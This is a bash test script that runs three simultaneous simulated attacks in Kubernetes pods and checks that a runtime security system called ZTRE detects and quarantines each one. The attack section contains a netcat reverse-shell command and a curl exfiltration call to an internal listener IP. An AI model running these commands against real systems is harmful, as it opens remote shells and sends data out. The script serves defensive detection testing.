#!/usr/bin/env bash
# ==============================================================================
# ZTRE Concurrent Multi-Attack Test
# Fires T1 (RCE) + T2 (exfiltration) + T3 (reverse shell) simultaneously
# from 3 different pods. Verifies all are detected and quarantined.
# ==============================================================================
set -euo pipefail

OUTPUT_DIR="evidence/concurrent"
RESULTS_FILE="$OUTPUT_DIR/parallel-containment-results.json"

COLOR_GREEN="\033[0;32m"
COLOR_RED="\033[0;31m"
COLOR_BLUE="\033[0;34m"
COLOR_RESET="\033[0m"
log_info()  { echo -e "${COLOR_BLUE}[INFO]${COLOR_RESET} $*"; }
log_pass()  { echo -e "${COLOR_GREEN}[PASS]${COLOR_RESET} $*"; }
log_fail()  { echo -e "${COLOR_RED}[FAIL]${COLOR_RESET} $*"; }

mkdir -p "$OUTPUT_DIR"

echo "======================================================================"
echo "    ZTRE Concurrent Multi-Attack Test                                  "
echo "======================================================================"

# 1. Setup: Deploy 3 independent attack target pods
log_info "Deploying 3 independent attack target pods..."

for i in 1 2 3; do
    kubectl delete pod "attack-target-${i}" -n ztre-test --ignore-not-found=true >/dev/null 2>&1 || true
done
sleep 2

for i in 1 2 3; do
    kubectl run "attack-target-${i}" -n ztre-test \
        --image=alpine \
        --restart=Never \
        --labels="app=attack-target-${i}" \
        -- /bin/sh -c 'apk add --no-cache curl netcat-openbsd >/dev/null 2>&1; sleep 300' \
        >/dev/null 2>&1
done

log_info "Waiting for attack target pods to become ready..."
for i in 1 2 3; do
    kubectl wait --for=condition=Ready "pod/attack-target-${i}" -n ztre-test --timeout=60s >/dev/null 2>&1
done
log_pass "All 3 attack target pods running"

# Metrics source: Prometheus over a port-forward (bastion has no route to pod IPs)
pkill -f "port-forward.*prometheus.*9092" 2>/dev/null || true
sleep 1
kubectl port-forward -n monitoring svc/prometheus 9092:9090 --address 127.0.0.1 \
    >/tmp/concurrent-prom-pf.log 2>&1 &
PF_PID=$!
sleep 4

promval() {
    local expr="$1"
    local enc
    enc=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$expr")
    curl -sf "http://127.0.0.1:9092/api/v1/query?query=${enc}" 2>/dev/null | python3 -c '
import json,sys
try:
    r=json.load(sys.stdin)["data"]["result"]
    print(r[0]["value"][1] if r else "0")
except Exception:
    print("0")
'
}

# Get agent metrics baseline
PRE_CONTAINMENTS=$(promval 'sum(ztre_containment_actions_total)')
PRE_ERRORS=$(promval 'sum(ztre_api_errors_total)')
PRE_DROPPED=$(promval 'sum(ztre_events_dropped_total)')

# 2. Launch all 3 attacks SIMULTANEOUSLY
log_info "Launching 3 concurrent attacks..."
ATTACK_START=$(date +%s%N)

# T1: RCE shell spawn on target-1
kubectl exec -n ztre-test attack-target-1 -- /bin/sh -c 'sh -c "sleep 1"' >/dev/null 2>&1 &
PID1=$!

# T2: Data exfiltration via curl on target-2
kubectl exec -n ztre-test attack-target-2 -- /bin/sh -c 'curl -s -m 2 http://10.91.128.10:9999/exfil || true' >/dev/null 2>&1 &
PID2=$!

# T3: Reverse shell via nc on target-3
kubectl exec -n ztre-test attack-target-3 -- /bin/sh -c 'nc -e /bin/sh 10.91.128.10 4444' >/dev/null 2>&1 &
PID3=$!

# Wait for attack commands to complete (they may timeout/fail, that's expected)
wait $PID1 2>/dev/null || true
wait $PID2 2>/dev/null || true
wait $PID3 2>/dev/null || true

ATTACK_END=$(date +%s%N)
ATTACK_DURATION_MS=$(( (ATTACK_END - ATTACK_START) / 1000000 ))
log_info "All 3 attacks launched in ${ATTACK_DURATION_MS}ms"

# 3. Wait for ZTRE to process and quarantine
log_info "Waiting 5s for ZTRE pipeline to process all events..."
sleep 5
# Allow Prometheus to scrape the post-attack counters (scrape interval is 15s)
log_info "Waiting 16s for Prometheus to scrape updated counters..."
sleep 16

# 4. Verify quarantine status for all 3 pods
PASS_COUNT=0
FAIL_COUNT=0
RESULTS=()

for i in 1 2 3; do
    LABEL=$(kubectl get pod "attack-target-${i}" -n ztre-test \
        -o jsonpath='{.metadata.labels.ztre/quarantine}' 2>/dev/null || echo "")
    PHASE=$(kubectl get pod "attack-target-${i}" -n ztre-test \
        -o jsonpath='{.status.phase}' 2>/dev/null || echo "Unknown")
    RESTARTS=$(kubectl get pod "attack-target-${i}" -n ztre-test \
        -o jsonpath='{.status.containerStatuses[0].restartCount}' 2>/dev/null || echo "0")
    
    if [ "$LABEL" = "true" ]; then
        log_pass "attack-target-${i}: QUARANTINED (phase=${PHASE}, restarts=${RESTARTS})"
        PASS_COUNT=$((PASS_COUNT + 1))
        STATUS="CONTAINED"
    else
        log_fail "attack-target-${i}: NOT QUARANTINED (label=${LABEL}, phase=${PHASE})"
        FAIL_COUNT=$((FAIL_COUNT + 1))
        STATUS="MISSED"
    fi
    RESULTS+=("{\"pod\":\"attack-target-${i}\",\"status\":\"${STATUS}\",\"phase\":\"${PHASE}\",\"restarts\":${RESTARTS}}")
done

# 5. Check metrics for errors and drops via Prometheus
POST_CONTAINMENTS=$(promval 'sum(ztre_containment_actions_total)')
POST_ERRORS=$(promval 'sum(ztre_api_errors_total)')
POST_DROPPED=$(promval 'sum(ztre_events_dropped_total)')

NEW_CONTAINMENTS=$(awk "BEGIN {printf \"%.0f\", ${POST_CONTAINMENTS:-0} - ${PRE_CONTAINMENTS:-0}}")
NEW_ERRORS=$(awk "BEGIN {printf \"%.0f\", ${POST_ERRORS:-0} - ${PRE_ERRORS:-0}}")
NEW_DROPPED=$(awk "BEGIN {printf \"%.0f\", ${POST_DROPPED:-0} - ${PRE_DROPPED:-0}}")

# 6. Write JSON results
RESULTS_JSON=$(printf '%s\n' "${RESULTS[@]}" | paste -sd',' -)
cat > "$RESULTS_FILE" <<EOF
{
  "test": "concurrent_multi_attack",
  "timestamp": "$(date -Iseconds)",
  "attacks_launched": 3,
  "attacks_launched_simultaneously": true,
  "attack_launch_duration_ms": ${ATTACK_DURATION_MS},
  "results": [${RESULTS_JSON}],
  "contained": ${PASS_COUNT},
  "missed": ${FAIL_COUNT},
  "new_containment_actions": "${NEW_CONTAINMENTS}",
  "new_api_errors": "${NEW_ERRORS}",
  "new_events_dropped": "${NEW_DROPPED}",
  "verdict": "$([ $PASS_COUNT -eq 3 ] && echo 'PASS' || echo 'FAIL')"
}
EOF

# 7. Summary
echo ""
echo "======================================================================"
echo "    Concurrent Attack Test Results                                     "
echo "======================================================================"
echo "  Attacks launched:     3 (simultaneously)"
echo "  Contained:            ${PASS_COUNT}/3"
echo "  Missed:               ${FAIL_COUNT}/3"
echo "  New containments:     ${NEW_CONTAINMENTS}"
echo "  API errors:           ${NEW_ERRORS}"
echo "  Events dropped:       ${NEW_DROPPED}"
echo "  Results file:         ${RESULTS_FILE}"
echo ""

if [ $PASS_COUNT -eq 3 ]; then
    log_pass "ALL 3 concurrent attacks detected and contained"
else
    log_fail "${FAIL_COUNT} attacks were NOT contained"
fi

# 8. Cleanup
log_info "Cleaning up attack target pods..."
for i in 1 2 3; do
    kubectl delete pod "attack-target-${i}" -n ztre-test --ignore-not-found=true >/dev/null 2>&1 || true
done
kill $PF_PID 2>/dev/null || true

echo "======================================================================"
